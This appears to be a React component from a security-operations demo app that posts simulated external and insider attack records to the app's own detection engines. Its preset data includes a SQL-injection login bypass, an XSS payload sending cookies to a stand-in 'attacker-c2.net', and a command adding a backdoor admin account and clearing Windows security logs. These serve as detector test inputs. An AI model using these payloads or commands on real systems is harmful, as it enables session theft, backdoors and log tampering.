import React, { useState } from 'react';
import { 
  Crosshair, 
  Terminal, 
  Send, 
  Cpu, 
  CheckCircle2, 
  ExternalLink,
  Zap,
  Globe,
  UserCheck,
  Clock,
  Play,
  Flame,
  ShieldAlert,
  Sparkles,
  Layers,
  Radio
} from 'lucide-react';
import { nidsClient, insiderClient } from '../services/apiClient';
import { Link } from 'react-router-dom';
import { useSOC } from '../context/SOCContext';

const PRESET_EXTERNAL_ATTACKS = [
  {
    id: 'sqli',
    name: 'SQL Injection (SQLi) - Auth Bypass',
    defaultPort: 80,
    protocol: 'TCP',
    defaultPayload: "GET /admin/login.php?user=admin' OR '1'='1' -- HTTP/1.1\r\nHost: target-host\r\nUser-Agent: sqlmap/1.7#dev",
    description: 'Injects tautology payload into HTTP request parameter to bypass authentication and dump database tables.'
  },
  {
    id: 'ddos_syn',
    name: 'SYN Flood / DDoS Traffic Saturation',
    defaultPort: 80,
    protocol: 'TCP',
    defaultPayload: 'SYN_FLOOD_SIMULATED_PACKET_STREAM_ATTACK',
    description: 'High-velocity TCP SYN storm designed to exhaust server socket buffers.'
  },
  {
    id: 'xss',
    name: 'Cross-Site Scripting (XSS) Stored Script',
    defaultPort: 443,
    protocol: 'TCP',
    defaultPayload: '<script>document.location="http://attacker-c2.net/steal?cookie="+document.cookie</script>',
    description: 'Malicious DOM payload targeting session cookie exfiltration.'
  },
  {
    id: 'brute_force',
    name: 'SSH Remote Root Brute Force',
    defaultPort: 22,
    protocol: 'TCP',
    defaultPayload: 'SSH-2.0-OpenSSH_8.9p1 Ubuntu\r\nFAILED_AUTH_USER_ROOT_PASSWORD_DICT_SIMULATION',
    description: 'Rapid credential dictionary spraying targeting remote administrative shell access.'
  },
  {
    id: 'port_scan',
    name: 'Reconnaissance TCP Port Scan',
    defaultPort: 80,
    protocol: 'TCP',
    defaultPayload: 'NMAP_TCP_SYN_STEALTH_SCAN_PROBE',
    description: 'Sequential scanning across privileged edge ports to map perimeter vulnerabilities.'
  }
];

const PRESET_INSIDER_ATTACKS = [
  {
    id: 'abnormal_login',
    name: 'Abnormal After-Hours Intrusion',
    action: 'database_login',
    resource: 'FIN_ORACLE_PROD_DB',
    riskIndicators: ['after_hours', 'unusual_ip', 'elevated_privilege'],
    details: 'Off-hours database access detected at anomalous 03:22 AM shift window.'
  },
  {
    id: 'mass_exfiltration',
    name: 'Sensitive Data Exfiltration & Download',
    action: 'bulk_archive_download',
    resource: 's3://corp-pii-backups/2026/clients_database.tar.gz',
    riskIndicators: ['bulk_download', 'sensitive_data', 'resignation_notice'],
    details: 'Downloading 4.8 GB of encrypted customer PII and credential archives to a personal storage drive.'
  },
  {
    id: 'privilege_abuse',
    name: 'Administrative Privilege Escalation',
    action: 'privilege_escalation',
    resource: 'ACTIVE_DIRECTORY_DC01',
    riskIndicators: ['shadow_account', 'log_tampering', 'admin_abuse'],
    details: 'net user backdoor_sec Pa$$w0rd! /add && wevtutil cl Security'
  },
  {
    id: 'unauthorized_file',
    name: 'Unauthorized Restricted File Traversal',
    action: 'access_denied_attempt',
    resource: '/shared/executive/compensation_2026.xlsx',
    riskIndicators: ['forbidden_path', 'repeated_rejection'],
    details: 'Repeated unauthorized traversal against restricted executive shared folders.'
  }
];

export const AttackerWorkspace = () => {
  const { fetchIncidents, triggerThreatNotification } = useSOC();

  // Attack Mode: 'external' | 'insider'
  const [attackMode, setAttackMode] = useState('external');

  // Common Target Parameters
  const [targetIp, setTargetIp] = useState('192.168.1.50');
  const [targetPort, setTargetPort] = useState('80');
  const [targetUserId, setTargetUserId] = useState('USR-CORP-01');
  const [targetUsername, setTargetUsername] = useState('internal.analyst');

  // External Parameters
  const [selectedExtAttack, setSelectedExtAttack] = useState(PRESET_EXTERNAL_ATTACKS[0]);
  const [customPayload, setCustomPayload] = useState(PRESET_EXTERNAL_ATTACKS[0].defaultPayload);

  // Insider Parameters
  const [selectedInsAttack, setSelectedInsAttack] = useState(PRESET_INSIDER_ATTACKS[0]);
  const [insiderDetails, setInsiderDetails] = useState(PRESET_INSIDER_ATTACKS[0].details);

  // Execution state
  const [isFiring, setIsFiring] = useState(false);
  const [activeFiringId, setActiveFiringId] = useState(null);
  const [attackResult, setAttackResult] = useState(null);

  const handleSelectExt = (atk) => {
    setSelectedExtAttack(atk);
    setTargetPort(String(atk.defaultPort));
    setCustomPayload(atk.defaultPayload);
  };

  const handleSelectIns = (atk) => {
    setSelectedInsAttack(atk);
    setInsiderDetails(atk.details);
  };

  // Launch any specific attack preset with 1-click
  const launchSpecificAttack = async (mode, atk) => {
    if (isFiring) return;
    setIsFiring(true);
    setActiveFiringId(atk.id);
    setAttackResult(null);

    const startTime = performance.now();

    if (mode === 'external') {
      setSelectedExtAttack(atk);
      setAttackMode('external');
      const port = atk.defaultPort || parseInt(targetPort, 10) || 80;
      const payloadString = atk.defaultPayload;
      const srcPort = Math.floor(1024 + Math.random() * 60000);
      const payload = [
        {
          timestamp: Date.now() / 1000,
          src_ip: '198.51.100.88',
          dst_ip: targetIp,
          src_port: srcPort,
          dst_port: port,
          protocol: atk.protocol || 'TCP',
          packet_length: payloadString.length + 40,
          flow_duration: 0.035,
          payload: payloadString
        }
      ];

      try {
        const res = await nidsClient.post('/predict', payload);
        const endTime = performance.now();
        const latency = Math.round(endTime - startTime);

        setAttackResult({
          success: true,
          mode: 'external',
          attackName: atk.name,
          targetIp,
          targetPort: port,
          latencyMs: latency,
          response: res.data,
          timestamp: new Date().toISOString()
        });

        triggerThreatNotification({
          title: '🚨 EXTERNAL ATTACK DETECTED & QUARANTINED',
          vector: atk.name,
          target: `${targetIp}:${port}`,
          action: res.data.action_taken || 'Firewall IP Blacklist Rule Enforced',
          confidence: res.data.confidence || 98.4
        });

        await fetchIncidents();
      } catch (err) {
        const endTime = performance.now();
        setAttackResult({
          success: false,
          mode: 'external',
          attackName: atk.name,
          targetIp,
          targetPort: port,
          latencyMs: Math.round(endTime - startTime),
          error: err.response?.data?.message || err.message || 'Connection failed to NIDS API',
          timestamp: new Date().toISOString()
        });
      }
    } else {
      setSelectedInsAttack(atk);
      setAttackMode('insider');
      const payload = {
        user_id: targetUserId,
        username: targetUsername,
        department: 'Corporate Staff',
        action: atk.action,
        resource: atk.resource,
        src_ip: targetIp,
        risk_indicators: atk.riskIndicators || [],
        timestamp: new Date().toISOString(),
        details: atk.details
      };

      try {
        const [res5001, res5000] = await Promise.allSettled([
          insiderClient.post('/api/ingest', payload),
          nidsClient.post('/api/ingest_insider', payload)
        ]);

        const endTime = performance.now();
        const latency = Math.round(endTime - startTime);
        const responseData = res5000.status === 'fulfilled' ? res5000.value.data : (res5001.status === 'fulfilled' ? res5001.value.data : {});

        setAttackResult({
          success: true,
          mode: 'insider',
          attackName: atk.name,
          targetUserId,
          targetUsername,
          targetIp,
          latencyMs: latency,
          response: responseData,
          timestamp: new Date().toISOString()
        });

        triggerThreatNotification({
          title: '🚨 INSIDER THREAT DETECTED & AUDITED',
          vector: `Insider Threat: ${atk.name}`,
          target: `${targetUsername} (${targetUserId} @ ${targetIp})`,
          action: 'Privileges Suspended & Session Quarantined',
          confidence: 96.0
        });

        await fetchIncidents();
      } catch (err) {
        const endTime = performance.now();
        setAttackResult({
          success: false,
          mode: 'insider',
          attackName: atk.name,
          targetUserId,
          targetUsername,
          latencyMs: Math.round(endTime - startTime),
          error: err.response?.data?.message || err.message || 'Connection failed to Insider Threat API',
          timestamp: new Date().toISOString()
        });
      }
    }

    setActiveFiringId(null);
    setIsFiring(false);
  };

  // Launch coordinated multi-vector burst
  const launchMultiVectorBurst = async () => {
    if (isFiring) return;
    setIsFiring(true);
    setActiveFiringId('burst');
    setAttackResult(null);

    const startTime = performance.now();
    try {
      const extAtk = PRESET_EXTERNAL_ATTACKS[0]; // SQLi
      const insAtk = PRESET_INSIDER_ATTACKS[1]; // Mass Exfiltration

      const srcPort = Math.floor(1024 + Math.random() * 60000);
      const extPayload = [
        {
          timestamp: Date.now() / 1000,
          src_ip: '198.51.100.99',
          dst_ip: targetIp,
          src_port: srcPort,
          dst_port: 80,
          protocol: 'TCP',
          packet_length: 130,
          flow_duration: 0.04,
          payload: extAtk.defaultPayload
        }
      ];

      const insPayload = {
        user_id: targetUserId,
        username: targetUsername,
        department: 'Corporate Staff',
        action: insAtk.action,
        resource: insAtk.resource,
        src_ip: targetIp,
        risk_indicators: insAtk.riskIndicators || [],
        timestamp: new Date().toISOString(),
        details: insAtk.details
      };

      const [extRes, ins5001, ins5000] = await Promise.allSettled([
        nidsClient.post('/predict', extPayload),
        insiderClient.post('/api/ingest', insPayload),
        nidsClient.post('/api/ingest_insider', insPayload)
      ]);

      const endTime = performance.now();
      const latency = Math.round(endTime - startTime);

      setAttackResult({
        success: true,
        mode: 'multi-vector',
        attackName: 'Coordinated Multi-Vector Cyber Attack (SQLi + Insider Exfiltration Burst)',
        targetIp,
        targetUsername,
        latencyMs: latency,
        response: {
          external_nids_defense: extRes.status === 'fulfilled' ? extRes.value.data : 'Blocked by Firewall',
          insider_ueba_defense: ins5000.status === 'fulfilled' ? ins5000.value.data : 'Flagged & Quarantined'
        },
        timestamp: new Date().toISOString()
      });

      triggerThreatNotification({
        title: '🚨 MULTI-VECTOR ATTACK INTERCEPTED',
        vector: 'Coordinated SQLi + Insider Exfiltration Burst',
        target: `${targetIp} & ${targetUsername}`,
        action: 'Firewall Auto-Blocked IP & Account Quarantined',
        confidence: 99.1
      });

      await fetchIncidents();
    } catch (err) {
      const endTime = performance.now();
      setAttackResult({
        success: false,
        mode: 'multi-vector',
        attackName: 'Coordinated Multi-Vector Cyber Attack Burst',
        latencyMs: Math.round(endTime - startTime),
        error: err.message || 'Failed to dispatch multi-vector attack',
        timestamp: new Date().toISOString()
      });
    } finally {
      setActiveFiringId(null);
      setIsFiring(false);
    }
  };

  const fireAttack = async () => {
    if (isFiring) return;
    setIsFiring(true);
    setActiveFiringId('custom');
    setAttackResult(null);

    const startTime = performance.now();

    if (attackMode === 'external') {
      const srcPort = Math.floor(1024 + Math.random() * 60000);
      const payload = [
        {
          timestamp: Date.now() / 1000,
          src_ip: '198.51.100.88',
          dst_ip: targetIp,
          src_port: srcPort,
          dst_port: parseInt(targetPort, 10) || 80,
          protocol: selectedExtAttack.protocol,
          packet_length: customPayload.length + 40,
          flow_duration: 0.035,
          payload: customPayload
        }
      ];

      try {
        const res = await nidsClient.post('/predict', payload);
        const endTime = performance.now();
        const latency = Math.round(endTime - startTime);

        setAttackResult({
          success: true,
          mode: 'external',
          attackName: selectedExtAttack.name,
          targetIp,
          targetPort,
          latencyMs: latency,
          response: res.data,
          timestamp: new Date().toISOString()
        });

        triggerThreatNotification({
          title: '🚨 EXTERNAL ATTACK DETECTED & QUARANTINED',
          vector: selectedExtAttack.name,
          target: `${targetIp}:${targetPort}`,
          action: res.data.action_taken || 'Firewall IP Blacklist Rule Enforced',
          confidence: res.data.confidence || 98.4
        });

        await fetchIncidents();
      } catch (err) {
        const endTime = performance.now();
        setAttackResult({
          success: false,
          mode: 'external',
          attackName: selectedExtAttack.name,
          targetIp,
          targetPort,
          latencyMs: Math.round(endTime - startTime),
          error: err.response?.data?.message || err.message || 'Connection failed to NIDS API',
          timestamp: new Date().toISOString()
        });
      }
    } else {
      const payload = {
        user_id: targetUserId,
        username: targetUsername,
        department: 'Corporate Staff',
        action: selectedInsAttack.action,
        resource: selectedInsAttack.resource,
        src_ip: targetIp,
        risk_indicators: selectedInsAttack.riskIndicators,
        timestamp: new Date().toISOString(),
        details: insiderDetails
      };

      try {
        const [res5001, res5000] = await Promise.allSettled([
          insiderClient.post('/api/ingest', payload),
          nidsClient.post('/api/ingest_insider', payload)
        ]);

        const endTime = performance.now();
        const latency = Math.round(endTime - startTime);
        const responseData = res5000.status === 'fulfilled' ? res5000.value.data : (res5001.status === 'fulfilled' ? res5001.value.data : {});

        setAttackResult({
          success: true,
          mode: 'insider',
          attackName: selectedInsAttack.name,
          targetUserId,
          targetUsername,
          targetIp,
          latencyMs: latency,
          response: responseData,
          timestamp: new Date().toISOString()
        });

        triggerThreatNotification({
          title: '🚨 INSIDER THREAT DETECTED & AUDITED',
          vector: `Insider Threat: ${selectedInsAttack.name}`,
          target: `${targetUsername} (${targetUserId} @ ${targetIp})`,
          action: 'Privileges Suspended & Session Quarantined',
          confidence: 96.0
        });

        await fetchIncidents();
      } catch (err) {
        const endTime = performance.now();
        setAttackResult({
          success: false,
          mode: 'insider',
          attackName: selectedInsAttack.name,
          targetUserId,
          targetUsername,
          latencyMs: Math.round(endTime - startTime),
          error: err.response?.data?.message || err.message || 'Connection failed to Insider Threat API',
          timestamp: new Date().toISOString()
        });
      }
    }

    setActiveFiringId(null);
    setIsFiring(false);
  };

  return (
    <div className="space-y-6">
      {/* Attacker Workspace Header */}
      <div className="bg-[#0b101d] border border-rose-500/30 rounded-xl p-6 shadow-2xl relative overflow-hidden">
        <div className="absolute top-0 right-0 w-96 h-40 bg-rose-500/10 blur-3xl pointer-events-none" />

        <div className="flex flex-col md:flex-row md:items-center md:justify-between gap-4">
          <div className="flex items-center gap-4">
            <div className="w-12 h-12 rounded-xl bg-rose-500/10 border border-rose-500/30 flex items-center justify-center text-rose-400 shadow-lg shadow-rose-500/10">
              <Crosshair className="w-6 h-6" />
            </div>
            <div>
              <div className="flex items-center gap-2">
                <span className="text-[10px] font-bold uppercase tracking-wider px-2 py-0.5 rounded bg-rose-500/20 text-rose-300 border border-rose-500/30">
                  WORKSPACE 3: RED-TEAM ATTACK STUDIO
                </span>
                <span className="text-[10px] font-mono text-rose-400 flex items-center gap-1 font-bold">
                  <span className="w-2 h-2 rounded-full bg-rose-500 animate-ping" />
                  RED-TEAM READY
                </span>
              </div>
              <h1 className="text-2xl font-black tracking-tight text-white mt-1">
                Attacker Workstation & Threat Injection Lab
              </h1>
              <p className="text-xs text-gray-400">
                Input any employee's IP address or corporate user credentials, configure custom payload exploits, and launch external or internal attacks directly into CASOC.
              </p>
            </div>
          </div>

          {/* Attack Domain Selector Buttons */}
          <div className="flex items-center gap-2 bg-black/40 p-1 rounded-lg border border-white/10">
            <button
              onClick={() => setAttackMode('external')}
              className={`px-3 py-1.5 rounded text-xs font-bold font-mono transition-all flex items-center gap-1.5 ${
                attackMode === 'external'
                  ? 'bg-rose-500 text-white shadow-md shadow-rose-500/20'
                  : 'text-gray-400 hover:text-white'
              }`}
            >
              <Globe className="w-3.5 h-3.5" />
              EXTERNAL ATTACK
            </button>
            <button
              onClick={() => setAttackMode('insider')}
              className={`px-3 py-1.5 rounded text-xs font-bold font-mono transition-all flex items-center gap-1.5 ${
                attackMode === 'insider'
                  ? 'bg-purple-600 text-white shadow-md shadow-purple-500/20'
                  : 'text-gray-400 hover:text-white'
              }`}
            >
              <UserCheck className="w-3.5 h-3.5" />
              INTERNAL / INSIDER ATTACK
            </button>
          </div>
        </div>

        {/* Quick Workspace Switcher Navigation */}
        <div className="mt-5 pt-4 border-t border-white/10 flex flex-wrap items-center gap-3 text-xs">
          <span className="text-gray-400 font-mono text-[11px] uppercase">SWITCH WORKSPACE:</span>
          <Link
            to="/admin-workspace"
            className="px-3 py-1 rounded bg-white/5 hover:bg-white/10 text-gray-300 hover:text-white border border-white/10 flex items-center gap-1 transition-colors"
          >
            <span>1. Admin Workspace (All Records)</span>
            <ExternalLink className="w-3 h-3" />
          </Link>
          <Link
            to="/user-workspace"
            className="px-3 py-1 rounded bg-white/5 hover:bg-white/10 text-gray-300 hover:text-white border border-white/10 flex items-center gap-1 transition-colors"
          >
            <span>2. User Workspace (Victim Posture)</span>
            <ExternalLink className="w-3 h-3" />
          </Link>
          <span className="px-3 py-1 rounded bg-rose-500/20 text-rose-300 border border-rose-500/40 font-bold">
            3. Attacker Workspace (Current)
          </span>
        </div>
      </div>

      {/* Quick-Strike 1-Click Launchpad Panel */}
      <div className="bg-[#0b101d] border border-rose-500/20 rounded-xl p-5 shadow-xl relative overflow-hidden">
        <div className="flex flex-col md:flex-row md:items-center justify-between gap-4 pb-4 border-b border-white/10">
          <div>
            <div className="flex items-center gap-2">
              <Flame className="w-4 h-4 text-rose-400" />
              <h2 className="text-sm font-bold text-white uppercase tracking-wider">
                Instant Attack Launchpad (One-Click Ingestion)
              </h2>
              <span className="text-[10px] font-mono px-2 py-0.5 rounded bg-rose-500/20 text-rose-300 border border-rose-500/30 font-bold">
                9 THREAT VECTORS READY
              </span>
            </div>
            <p className="text-xs text-gray-400 mt-1">
              Click any button below to instantly trigger that live attack against <span className="text-cyan-400 font-mono font-bold">{targetIp}</span> / <span className="text-purple-300 font-mono font-bold">{targetUsername}</span> and watch CASOC intercept it.
            </p>
          </div>

          {/* Multi-Vector Burst Button */}
          <button
            type="button"
            disabled={isFiring}
            onClick={launchMultiVectorBurst}
            className="px-4 py-2 rounded-xl bg-gradient-to-r from-rose-600 via-purple-600 to-indigo-600 hover:from-rose-500 hover:via-purple-500 hover:to-indigo-500 text-white text-xs font-bold font-mono flex items-center gap-2 shadow-lg shadow-purple-950/50 border border-white/20 transition-all hover:scale-[1.02] active:scale-95 disabled:opacity-50 shrink-0"
            title="Launch simultaneous external network attack and insider threat exfiltration"
          >
            {isFiring && activeFiringId === 'burst' ? (
              <>
                <Zap className="w-4 h-4 animate-spin text-amber-300" />
                <span>Dispatching Multi-Vector Storm...</span>
              </>
            ) : (
              <>
                <Sparkles className="w-4 h-4 text-amber-300" />
                <span>Simulate Multi-Vector Attack Burst</span>
              </>
            )}
          </button>
        </div>

        {/* Quick Buttons Grid */}
        <div className="grid grid-cols-1 md:grid-cols-2 gap-4 pt-4">
          {/* External Network Attacks Quick Launchers */}
          <div className="space-y-2">
            <div className="text-[10px] font-mono uppercase tracking-wider text-cyan-400 flex items-center gap-1.5 font-bold">
              <Globe className="w-3.5 h-3.5" />
              <span>External Exploits (NIDS ML Engine :5000)</span>
            </div>
            <div className="grid grid-cols-1 sm:grid-cols-2 gap-2">
              {PRESET_EXTERNAL_ATTACKS.map((atk) => (
                <button
                  key={`quick-${atk.id}`}
                  type="button"
                  disabled={isFiring}
                  onClick={() => launchSpecificAttack('external', atk)}
                  className="p-2.5 rounded-lg bg-rose-500/10 hover:bg-rose-500/20 border border-rose-500/25 hover:border-rose-500/50 text-left transition-all flex items-center justify-between group disabled:opacity-50"
                  title={`Launch ${atk.name}`}
                >
                  <div className="truncate mr-2">
                    <div className="text-xs font-bold text-white group-hover:text-rose-200 truncate">
                      {atk.name.split('-')[0].trim()}
                    </div>
                    <div className="text-[10px] font-mono text-gray-400">Port {atk.defaultPort} / {atk.protocol}</div>
                  </div>
                  <span className="px-2 py-1 rounded bg-rose-600 group-hover:bg-rose-500 text-white text-[10px] font-bold font-mono shrink-0 flex items-center gap-1 shadow-sm">
                    {isFiring && activeFiringId === atk.id ? (
                      <Zap className="w-3 h-3 animate-spin text-amber-300" />
                    ) : (
                      <Play className="w-2.5 h-2.5 fill-current" />
                    )}
                    <span>Launch</span>
                  </span>
                </button>
              ))}
            </div>
          </div>

          {/* Insider Threat Vectors Quick Launchers */}
          <div className="space-y-2">
            <div className="text-[10px] font-mono uppercase tracking-wider text-purple-400 flex items-center gap-1.5 font-bold">
              <UserCheck className="w-3.5 h-3.5" />
              <span>Insider Threat Vectors (UEBA Engine :5001)</span>
            </div>
            <div className="grid grid-cols-1 sm:grid-cols-2 gap-2">
              {PRESET_INSIDER_ATTACKS.map((atk) => (
                <button
                  key={`quick-${atk.id}`}
                  type="button"
                  disabled={isFiring}
                  onClick={() => launchSpecificAttack('insider', atk)}
                  className="p-2.5 rounded-lg bg-purple-500/10 hover:bg-purple-500/20 border border-purple-500/25 hover:border-purple-500/50 text-left transition-all flex items-center justify-between group disabled:opacity-50"
                  title={`Launch ${atk.name}`}
                >
                  <div className="truncate mr-2">
                    <div className="text-xs font-bold text-white group-hover:text-purple-200 truncate">
                      {atk.name}
                    </div>
                    <div className="text-[10px] font-mono text-gray-400 truncate">{atk.action}</div>
                  </div>
                  <span className="px-2 py-1 rounded bg-purple-600 group-hover:bg-purple-500 text-white text-[10px] font-bold font-mono shrink-0 flex items-center gap-1 shadow-sm">
                    {isFiring && activeFiringId === atk.id ? (
                      <Zap className="w-3 h-3 animate-spin text-amber-300" />
                    ) : (
                      <Play className="w-2.5 h-2.5 fill-current" />
                    )}
                    <span>Launch</span>
                  </span>
                </button>
              ))}
            </div>
          </div>
        </div>
      </div>

      {/* Main Target Configuration Form */}
      <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
        {/* Left Column: Target Inputs & Attack Vectors (7 cols) */}
        <div className="lg:col-span-7 space-y-5">
          {/* Target Host / IP Configuration Card */}
          <div className="bg-[#0b101d] border border-white/10 rounded-xl p-5 space-y-4 shadow-lg">
            <div className="flex items-center justify-between pb-3 border-b border-white/10">
              <span className="text-xs font-bold text-white uppercase tracking-wider flex items-center gap-2">
                <Crosshair className="w-4 h-4 text-rose-400" />
                Target Specification Form
              </span>
              <span className="text-[10px] font-mono text-gray-400">ENTER VICTIM DETAILS</span>
            </div>

            {/* Target Presets for quick convenience */}
            <div className="flex items-center gap-2 flex-wrap">
              <span className="text-[10px] font-mono text-gray-400 uppercase">QUICK PRESET TARGETS:</span>
              <button
                type="button"
                onClick={() => { setTargetIp('192.168.1.50'); setTargetUserId('USR-CORP-01'); setTargetUsername('staff.terminal01'); }}
                className="px-2 py-0.5 rounded bg-white/5 hover:bg-white/10 text-[11px] font-mono text-cyan-300 border border-white/10"
              >
                Endpoint 1 (192.168.1.50)
              </button>
              <button
                type="button"
                onClick={() => { setTargetIp('192.168.1.88'); setTargetUserId('MOH0273'); setTargetUsername('Macaulay Hopkins'); }}
                className="px-2 py-0.5 rounded bg-white/5 hover:bg-white/10 text-[11px] font-mono text-purple-300 border border-white/10"
              >
                MOH0273 (Macaulay Hopkins)
              </button>
              <button
                type="button"
                onClick={() => { setTargetIp('192.168.1.102'); setTargetUserId('NGF0157'); setTargetUsername('Nissim French'); }}
                className="px-2 py-0.5 rounded bg-white/5 hover:bg-white/10 text-[11px] font-mono text-amber-300 border border-white/10"
              >
                NGF0157 (Nissim French)
              </button>
              <button
                type="button"
                onClick={() => { setTargetIp('192.168.1.148'); setTargetUserId('LRR0148'); setTargetUsername('Libby Richard'); }}
                className="px-2 py-0.5 rounded bg-white/5 hover:bg-white/10 text-[11px] font-mono text-rose-300 border border-white/10"
              >
                LRR0148 (Libby Richard)
              </button>
            </div>

            <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
              {/* Target IP Input */}
              <div>
                <label className="block text-xs font-mono text-gray-300 mb-1">
                  Victim / Host IP Address:
                </label>
                <input
                  type="text"
                  value={targetIp}
                  onChange={(e) => setTargetIp(e.target.value)}
                  placeholder="e.g. 192.168.1.50"
                  className="w-full bg-[#131c2e] border border-white/15 rounded-lg px-3 py-2 text-xs font-mono text-white focus:outline-none focus:border-rose-500 font-bold"
                />
              </div>

              {/* Target Port */}
              <div>
                <label className="block text-xs font-mono text-gray-300 mb-1">
                  Target Destination Port:
                </label>
                <input
                  type="number"
                  value={targetPort}
                  onChange={(e) => setTargetPort(e.target.value)}
                  placeholder="80"
                  className="w-full bg-[#131c2e] border border-white/15 rounded-lg px-3 py-2 text-xs font-mono text-white focus:outline-none focus:border-rose-500 font-bold"
                />
              </div>

              {/* Employee ID (for Insider Attack) */}
              <div>
                <label className="block text-xs font-mono text-gray-300 mb-1">
                  Target Employee ID:
                </label>
                <input
                  type="text"
                  value={targetUserId}
                  onChange={(e) => setTargetUserId(e.target.value)}
                  placeholder="USR-8821"
                  className="w-full bg-[#131c2e] border border-white/15 rounded-lg px-3 py-2 text-xs font-mono text-white focus:outline-none focus:border-purple-500 font-bold"
                />
              </div>

              {/* Employee Username */}
              <div>
                <label className="block text-xs font-mono text-gray-300 mb-1">
                  Target Employee Username:
                </label>
                <input
                  type="text"
                  value={targetUsername}
                  onChange={(e) => setTargetUsername(e.target.value)}
                  placeholder="e.g. employee.username"
                  className="w-full bg-[#131c2e] border border-white/15 rounded-lg px-3 py-2 text-xs font-mono text-white focus:outline-none focus:border-purple-500 font-bold"
                />
              </div>
            </div>
          </div>

          {/* Select Attack Vector */}
          <div className="bg-[#0b101d] border border-white/10 rounded-xl p-5 space-y-4 shadow-lg">
            <div className="flex items-center justify-between pb-3 border-b border-white/10">
              <span className="text-xs font-bold text-white uppercase tracking-wider flex items-center gap-2">
                <Terminal className="w-4 h-4 text-cyan-400" />
                Select Attack Vector & Payload
              </span>
              <span className="text-[10px] font-mono text-gray-400">
                {attackMode === 'external' ? 'NIDS PORT 5000' : 'UEBA PORT 5001'}
              </span>
            </div>

            {/* External Attack Presets */}
            {attackMode === 'external' ? (
              <div className="space-y-2.5">
                {PRESET_EXTERNAL_ATTACKS.map((atk) => (
                  <div
                    key={atk.id}
                    onClick={() => handleSelectExt(atk)}
                    className={`w-full p-3 rounded-lg border text-left transition-all flex flex-col sm:flex-row sm:items-center justify-between gap-3 cursor-pointer ${
                      selectedExtAttack.id === atk.id
                        ? 'bg-rose-500/15 border-rose-500/50 text-white shadow-lg shadow-rose-950/30 ring-1 ring-rose-500/30'
                        : 'bg-white/[0.02] border-white/5 hover:border-white/20 text-gray-300 hover:text-white'
                    }`}
                  >
                    <div className="flex-1">
                      <div className="text-xs font-bold text-white flex items-center gap-2 flex-wrap">
                        <span>{atk.name}</span>
                        <span className="text-[9px] font-mono px-1.5 py-0.5 rounded bg-white/10 text-cyan-300 border border-white/10">
                          PORT {atk.defaultPort} / {atk.protocol}
                        </span>
                        {selectedExtAttack.id === atk.id && (
                          <span className="text-[9px] font-mono px-1.5 py-0.5 rounded bg-rose-500/20 text-rose-300 border border-rose-500/30 font-bold">
                            EDITING PAYLOAD
                          </span>
                        )}
                      </div>
                      <div className="text-[11px] text-gray-400 mt-1">{atk.description}</div>
                    </div>

                    <div className="flex items-center gap-2 self-end sm:self-center shrink-0" onClick={(e) => e.stopPropagation()}>
                      <button
                        type="button"
                        onClick={() => handleSelectExt(atk)}
                        className={`px-2.5 py-1.5 rounded text-[11px] font-mono transition-colors border ${
                          selectedExtAttack.id === atk.id
                            ? 'bg-white/15 text-white border-white/30 font-bold'
                            : 'bg-white/5 text-gray-400 hover:text-white border-white/5'
                        }`}
                      >
                        Config
                      </button>
                      <button
                        type="button"
                        disabled={isFiring}
                        onClick={() => launchSpecificAttack('external', atk)}
                        className="px-3.5 py-1.5 rounded-lg bg-rose-600 hover:bg-rose-500 active:scale-95 text-white text-xs font-bold font-mono flex items-center gap-1.5 transition-all shadow-md shadow-rose-950/40 disabled:opacity-50"
                        title={`Launch ${atk.name} immediately`}
                      >
                        {isFiring && activeFiringId === atk.id ? (
                          <>
                            <Zap className="w-3.5 h-3.5 animate-spin text-amber-300" />
                            <span>Firing...</span>
                          </>
                        ) : (
                          <>
                            <Play className="w-3.5 h-3.5 fill-current text-white" />
                            <span>Launch Attack</span>
                          </>
                        )}
                      </button>
                    </div>
                  </div>
                ))}

                {/* Custom Payload Editor */}
                <div className="pt-3">
                  <label className="block text-xs font-mono text-gray-300 mb-1">
                    Raw Injected Payload (Editable):
                  </label>
                  <textarea
                    rows={3}
                    value={customPayload}
                    onChange={(e) => setCustomPayload(e.target.value)}
                    className="w-full bg-[#131c2e] border border-white/15 rounded-lg p-2.5 text-xs font-mono text-cyan-300 focus:outline-none focus:border-rose-500"
                  />
                </div>
              </div>
            ) : (
              /* Insider Attack Presets */
              <div className="space-y-2.5">
                {PRESET_INSIDER_ATTACKS.map((atk) => (
                  <div
                    key={atk.id}
                    onClick={() => handleSelectIns(atk)}
                    className={`w-full p-3 rounded-lg border text-left transition-all flex flex-col sm:flex-row sm:items-center justify-between gap-3 cursor-pointer ${
                      selectedInsAttack.id === atk.id
                        ? 'bg-purple-500/15 border-purple-500/50 text-white shadow-lg shadow-purple-950/30 ring-1 ring-purple-500/30'
                        : 'bg-white/[0.02] border-white/5 hover:border-white/20 text-gray-300 hover:text-white'
                    }`}
                  >
                    <div className="flex-1">
                      <div className="text-xs font-bold text-white flex items-center gap-2 flex-wrap">
                        <span>{atk.name}</span>
                        <span className="text-[9px] font-mono px-1.5 py-0.5 rounded bg-purple-500/20 text-purple-300 border border-purple-500/30">
                          {atk.action}
                        </span>
                        {selectedInsAttack.id === atk.id && (
                          <span className="text-[9px] font-mono px-1.5 py-0.5 rounded bg-purple-500/30 text-purple-200 border border-purple-500/40 font-bold">
                            EDITING DETAILS
                          </span>
                        )}
                      </div>
                      <div className="text-[11px] text-gray-400 mt-1">Resource: <span className="font-mono text-purple-300">{atk.resource}</span></div>
                    </div>

                    <div className="flex items-center gap-2 self-end sm:self-center shrink-0" onClick={(e) => e.stopPropagation()}>
                      <button
                        type="button"
                        onClick={() => handleSelectIns(atk)}
                        className={`px-2.5 py-1.5 rounded text-[11px] font-mono transition-colors border ${
                          selectedInsAttack.id === atk.id
                            ? 'bg-white/15 text-white border-white/30 font-bold'
                            : 'bg-white/5 text-gray-400 hover:text-white border-white/5'
                        }`}
                      >
                        Config
                      </button>
                      <button
                        type="button"
                        disabled={isFiring}
                        onClick={() => launchSpecificAttack('insider', atk)}
                        className="px-3.5 py-1.5 rounded-lg bg-purple-600 hover:bg-purple-500 active:scale-95 text-white text-xs font-bold font-mono flex items-center gap-1.5 transition-all shadow-md shadow-purple-950/40 disabled:opacity-50"
                        title={`Launch ${atk.name} immediately`}
                      >
                        {isFiring && activeFiringId === atk.id ? (
                          <>
                            <Zap className="w-3.5 h-3.5 animate-spin text-amber-300" />
                            <span>Firing...</span>
                          </>
                        ) : (
                          <>
                            <Play className="w-3.5 h-3.5 fill-current text-white" />
                            <span>Launch Attack</span>
                          </>
                        )}
                      </button>
                    </div>
                  </div>
                ))}

